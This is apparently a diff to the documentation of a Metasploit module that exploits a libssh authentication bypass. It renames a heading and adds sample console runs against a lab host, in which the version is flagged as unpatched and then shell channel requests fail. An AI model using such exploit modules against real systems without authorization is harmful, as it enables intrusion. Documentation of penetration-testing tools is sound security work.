@@ -1,4 +1,4 @@
-## Intro
+## Introduction
 
 This module exploits an authentication bypass in libssh server code
 where a `USERAUTH_SUCCESS` message is sent in place of the expected
@@ -122,7 +122,14 @@ msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
-[-] 172.28.128.3:2222 - shell/exec channel request failed
+[-] 172.28.128.3:2222 - Net::SSH::ChannelOpenFailed: Session channel open failed (1)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+
+[*] 172.28.128.3:2222 - Attempting authentication bypass
+[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
+[-] 172.28.128.3:2222 - Net::SSH::ChannelRequestFailed: Shell/exec channel request failed
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
